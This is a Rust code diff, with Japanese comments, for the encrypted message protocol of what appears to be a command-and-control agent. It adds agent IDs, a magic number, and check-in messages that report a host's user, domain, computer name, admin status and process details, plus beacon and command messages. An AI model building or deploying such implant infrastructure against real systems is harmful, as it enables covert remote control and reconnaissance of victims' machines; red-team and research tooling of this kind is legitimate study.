@@ -20,6 +20,14 @@ impl Packer {
     pub fn new() -> Self {
         Self { buf: BytesMut::new() }
     }
+    
+    pub fn pack_bool(&mut self, value: bool) -> &mut Self {
+        match value {
+            true => self.buf.put_u8(1),
+            false => self.buf.put_u8(0),
+        }
+        self
+    }
 
     pub fn pack_u8(&mut self, value: u8) -> &mut Self {
         self.buf.put_u8(value);
@@ -71,6 +79,19 @@ pub struct UnPacker {
 impl UnPacker {
     pub fn new(buf: Bytes) -> Self {
         Self { buf }
+    }
+
+    pub fn unpack_bool(&mut self) -> anyhow::Result<bool> {
+        if self.buf.remaining() < 1 {
+            anyhow::bail!("buffer overflow");
+        }
+
+        let value = self.buf.get_u8();
+
+        match value {
+            0 => Ok(false),
+            _ => Ok(true),
+        }
     }
 
     pub fn unpack_u8(&mut self) -> anyhow::Result<u8> {
@@ -183,13 +204,42 @@ pub struct Plain;
 pub struct Encrypted;
 
 pub struct Packet<State> {
+    magic: u16, // 0xf3f3
+    agent_id: u128,
     payload: Bytes,
     _state: PhantomData<State>,
 }
 
+impl TryFrom<Bytes> for Packet<Encrypted> {
+    type Error = anyhow::Error;
+
+    fn try_from(value: Bytes) -> Result<Self, Self::Error> {
+        let mut u = UnPacker::new(value);
+        let magic = u.unpack_u16()?; 
+
+        if magic != MAGIC_NUMBER {
+            anyhow::bail!("Invalid magic number")
+        }
+
+        let agent_id = u.unpack_u128()?;
+        
+        Ok(Self {
+            magic,
+            agent_id,
+            payload: u.buf,
+            _state: PhantomData,
+        })
+
+    }
+}
+
 impl Packet<Plain> {
-    pub fn new(payload: Bytes) -> Self {
-        Self { payload, _state: PhantomData }
+    pub fn new(agent_id: u128, payload: Bytes) -> Self {
+        Self { magic: MAGIC_NUMBER, agent_id, payload, _state: PhantomData }
+    }
+
+    pub fn get_payload(&self) -> anyhow::Result<Payload> {
+        Payload::deserialize(self.payload.clone())
     }
 
     pub fn encrypt(self, key: [u8; 32]) -> anyhow::Result<Packet<Encrypted>> {
@@ -206,21 +256,22 @@ impl Packet<Plain> {
         nonce_and_cipher.append(&mut cipher_text);  // nonceは先頭に付与
 
         Ok(Packet {
+            magic: MAGIC_NUMBER,
+            agent_id: self.agent_id,
             payload: nonce_and_cipher.into(),
             _state: PhantomData,
         })
     }
 
-    pub fn deserialize(self) -> anyhow::Result<Payload> {
-        Payload::deserialize(self.payload)
-    }
 }
 
 impl Packet<Encrypted> {
-    pub fn new(payload: Bytes) -> Self {
-        Self { payload, _state: PhantomData }
+    pub fn new(agent_id: u128, payload: Bytes) -> Self {
+        Self { magic: MAGIC_NUMBER, agent_id, payload, _state: PhantomData }
     }
 
+    pub fn get_agent_id(&self) -> u128 { self.agent_id }
+    
     pub fn decrypt(mut self, key: [u8; 32]) -> anyhow::Result<Packet<Plain>> {
         if self.payload.len() < NONCE_LEN {
            anyhow::bail!("Packet decrypt failed: nonce required");
@@ -239,29 +290,37 @@ impl Packet<Encrypted> {
             .map_err(|e| anyhow::anyhow!("Packet decrypt failed: {e}"))?;
 
         Ok(Packet {
+            magic: MAGIC_NUMBER,
+            agent_id: self.agent_id,
             payload: plain.into(),
             _state: PhantomData,
         })
          
     }
 
+    pub fn serialize(self) -> Bytes {
+        let mut p = Packer::new();
+        p.pack_u16(self.magic)
+            .pack_u128(self.agent_id)
+            .pack_raw_bytes(&self.payload);
+        p.finish()
+    }
+
 }
 
 #[repr(C)]
 pub struct Payload {
-    pub magic: u16, // 0xf3f3
     pub data: MessageBody,
 }
 
 impl Payload {
     pub fn new(body: MessageBody) -> Self {
-        Self { magic: 0xf3f3, data: body }
+        Self { data: body }
     }
 
     pub fn serialize(&self) -> Bytes {
         // PackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
         let mut p = Packer::new();
-        p.pack_u16(self.magic);
         self.data.serialize(&mut p);
         p.finish()
     }
@@ -269,35 +328,30 @@ impl Payload {
     pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> {
         // UnpackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
         let mut u = UnPacker::new(buf);
-        let magic = u.unpack_u16()?;
-
-        if magic != 0xf3f3 {
-            anyhow::bail!("Invalid magic number ");
-        }
-
         let data = MessageBody::deserialize(&mut u)?;
-        Ok(Self { magic, data })
+        Ok(Self { data })
     }
 }
-// チェックインとBeatの見分け方
-// チェックインキーとSessionキー
-// すべてのパケットについてチェックインキーで復号を試みて成功すればチェックインプロセスへ移行
-// 失敗時には先頭からu32を取得してAgentIDとしてエージェントを特定する
+
 #[repr(u32)]
 pub enum MessageBody {
     Checkin {
-        agent_pubkey: [u8; 32],
-        os: String,
-        hostname: String,
-        username: String,
+        listener_id: u128,
+        process_id: u64,
+        thread_id: u64,
+        arch: String,
+        is_admin: bool,
         process_name: String,
+        os: String,
+        domain_name: String,
+        computer_name: String,
+        user_name: String,
+        received_pubkey: [u8; 32],
     } = 0x0001,
     CheckinAck {
         session_pubkey: [u8; 32],
-        agent_id: u128,
     } = 0x0002,
     Beat {
-        agent_id: u128,
         command_results: CommandResults,
     } = 0x0003,
     Command {
@@ -329,33 +383,43 @@ impl MessageBody {
 
     pub fn serialize(&self, p: &mut Packer) {
         match self {
-            MessageBody::Checkin { 
-                agent_pubkey, 
-                os, 
-                hostname, 
-                username, 
-                process_name 
+            MessageBody::Checkin {
+                listener_id,
+                process_id,
+                thread_id,
+                arch,
+                is_admin,
+                process_name,
+                os,
+                domain_name,
+                computer_name,
+                user_name,
+                received_pubkey,
             } => {
                 p.pack_u8(self.body_id())
-                    .pack_bytes(agent_pubkey)
+                    .pack_u128(*listener_id)
+                    .pack_u64(*process_id)
+                    .pack_u64(*thread_id)
+                    .pack_bytes(arch.as_bytes())
+                    .pack_bool(*is_admin)
+                    .pack_bytes(process_name.as_bytes())
                     .pack_bytes(os.as_bytes())
-                    .pack_bytes(hostname.as_bytes())
-                    .pack_bytes(username.as_bytes())
-                    .pack_bytes(process_name.as_bytes());
+                    .pack_bytes(domain_name.as_bytes())
+                    .pack_bytes(computer_name.as_bytes())
+                    .pack_bytes(user_name.as_bytes())
+                    .pack_bytes(received_pubkey);
             },
 
-            MessageBody::CheckinAck { session_pubkey, agent_id } => {
+            MessageBody::CheckinAck { session_pubkey } => {
                 p.pack_u8(self.body_id())
-                    .pack_bytes(session_pubkey)
-                    .pack_u128(*agent_id);
+                    .pack_bytes(session_pubkey);
             },
             MessageBody::Command { commands } => {
                 p.pack_u8(self.body_id());
                 commands.serialize(p);
             },
-            MessageBody::Beat { agent_id, command_results } => {
-                p.pack_u8(self.body_id())
-                    .pack_u128(*agent_id);
+            MessageBody::Beat { command_results } => {
+                p.pack_u8(self.body_id());
                 command_results.serialize(p);
             },
         }
@@ -366,18 +430,22 @@ impl MessageBody {
 
         match body_id {
             MSG_CHECKIN => Ok(Self::Checkin { 
-                agent_pubkey: u.unpack_32bytes()?, 
-                os: u.unpack_utf16le_string()?,
-                hostname: u.unpack_utf16le_string()?,
-                username: u.unpack_utf16le_string()?,
-                process_name: u.unpack_utf16le_string()?,
+                listener_id: u.unpack_u128()?,
+                process_id: u.unpack_u64()?,
+                thread_id: u.unpack_u64()?,
+                arch: u.unpack_utf8_string()?,
+                is_admin: u.unpack_bool()?,
+                process_name: u.unpack_utf8_string()?,
+                os: u.unpack_utf8_string()?,
+                domain_name: u.unpack_utf8_string()?,
+                computer_name: u.unpack_utf8_string()?,
+                user_name: u.unpack_utf8_string()?,
+                received_pubkey: u.unpack_32bytes()?,
             }),
             MSG_CHECKINACK => Ok(Self::CheckinAck { 
                 session_pubkey: u.unpack_32bytes()?,
-                agent_id: u.unpack_u128()?,
             }),
             MSG_BEAT => Ok(Self::Beat { 
-                agent_id: u.unpack_u128()?,
                 command_results: CommandResults::deserialize(u)?,
             }),
             MSG_COMMAND => Ok(Self::Command { 
@@ -388,7 +456,7 @@ impl MessageBody {
     }
 }
 
-pub struct Commands(Vec<Command>);
+pub struct Commands(pub Vec<Command>);
 
 impl Commands {
     pub fn serialize(&self, p: &mut Packer) {
